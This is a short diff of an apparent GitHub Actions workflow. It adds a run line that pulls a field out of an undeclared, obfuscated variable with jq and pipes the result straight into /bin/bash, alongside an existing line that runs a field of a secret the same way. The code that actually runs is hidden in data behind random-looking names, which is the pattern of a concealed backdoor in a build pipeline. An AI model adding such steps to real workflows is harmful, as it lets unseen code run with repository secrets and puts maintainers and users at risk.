@@ -19,6 +19,7 @@ jobs:
           yn6: ${{ secrets.yn6 }}
         run: |
           printf '%s' "$yn6" | jq -r .gn68789 | /bin/bash
+          echo $wq44517 | jq -r .nauby934 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
